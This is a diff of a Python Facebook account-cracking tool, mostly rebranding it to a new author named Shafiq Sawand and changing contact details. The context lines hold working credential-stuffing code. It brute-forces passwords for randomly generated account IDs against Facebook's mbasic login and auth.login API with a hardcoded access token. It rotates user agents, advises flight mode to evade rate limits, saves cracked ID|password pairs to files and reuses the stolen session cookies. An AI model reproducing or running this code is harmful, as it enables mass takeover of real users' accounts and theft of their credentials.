@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ JAHIED-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ SHAFIQ-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ JAHIED-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ SHAFIQ-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/JAHIED-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SHAFIQ-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -389,26 +389,23 @@ def follow(ses,coki):
 
 logo = ("""\033[1;32m
 
- SSSSS    AAA   KK  KK IIIII BBBBBB
-SS       AAAAA  KK KK   III  BB   BB
- SSSSS  AA   AA KKKK    III  BBBBBB  
-     SS AAAAAAA KK KK   III  BB   BB 
- SSSSS  AA   AA KK  KK IIIII BBBBBB  
-                        
+❝𝐒𝐇𝐀𝐅𝐈𝐐 𝐊𝐇𝐀𝐍 𝐒𝐀𝐖𝐀𝐍𝐃❞
+
+
   \033
 __________________×__×____________________
   
-  Auther   :  JOKER SAKIB
+  Auther   :  SHAFIQ SAWAND 
  
-  Github   :  devil-sakib
+  Github   :  SHAFIQ-SAWAND 
 
-  Facebook :  °_° facebook id nai
+  Facebook :  SHAFIQ UR REHMAN 
   
-  Contact :  01903226586 (whatsapp)
+  WHATSAPP :  +923106116534
   
-  Youtube : Joker Vaiya Sakib
+  Youtube :  AVAILABLE SOON 
 
-Free Tool Enjoy Koro Kolizar Vai-Brothers  🥰
+A POWERFUL FB CRACKER TOOL BY SHAFIQ SAWAND 
 __________________×__×____________________\033[1;37m""")
 
 class Main:
@@ -424,7 +421,7 @@ class Main:
 		print(" [3] Create File")
 		print(" [4] 2009-10 Cloning")
 		print(" [5] 2011-14 Cloning")
-		print(" [E] Exit Programming\n")
+		print(" [6] Exit Programming\n")
 		JAHIED =input(" Choose : ")
 		if JAHIED in ["1", "01"]:
 			File()
@@ -465,7 +462,7 @@ class Main:
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
 				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] ID CRACK NA HOILE AIRPLANE MODE ON KORBA\x1b[0m\n"%(P))
+				print("%s [!] USE FLIGHT MODE IF NO ACCOUNT CRACK\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
@@ -837,7 +834,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ SAKIB ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ SHAFIQ ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -857,12 +854,12 @@ class Main:
 				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-JOKER-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SHAFIQ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-JOKER-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SHAFIQ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -874,7 +871,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m KOTO ID CRACK KORBA- LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m FB ACCOUNT CRACKER- LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -892,7 +889,7 @@ class Main:
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
 				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] CRACK NA HOILE  AIRPLANE MODE ON KORBA\x1b[0m\n"%(P))
+				print("%s [!] USE FLIGHT MODE IF NO ACCOUNT CRACK\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
@@ -1281,15 +1278,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-JOKER-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SHAFIQ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m [SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-JOKER-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SHAFIQ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1314,8 +1311,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m SAKIB Tool Totally Free Just You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : Paid Tool Free Kora Hoiche \033[1;37m")
+		print(" \033[1;32m SHAFIQ Paid Tool You Need To Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note : Paid Tool \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
